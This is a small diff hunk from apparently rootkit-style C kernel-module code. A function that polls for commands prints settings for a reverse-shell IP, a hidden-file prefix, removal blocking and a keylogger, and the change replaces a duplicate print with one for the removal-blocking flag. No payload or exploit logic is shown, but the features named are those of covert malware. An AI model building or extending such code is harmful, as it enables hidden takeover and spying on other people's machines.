@@ -208,7 +208,7 @@ static void poll_for_commands(unsigned long data) {
     log_info("Polling for commands!\n");
 	printk(KERN_INFO "rev_shell_ip: %s", rev_shell_ip);
 	printk(KERN_INFO "hidden_file_prefix: %s", hidden_file_prefix);
-	printk(KERN_INFO "rev_shell_ip: %s", rev_shell_ip);
+	printk(KERN_INFO "block_removal: %d", block_removal);
 	printk(KERN_INFO "keylogger enabled: %d", keylogger);
 
     if (rev_shell_ip != cmds.rev_shell_ip) {
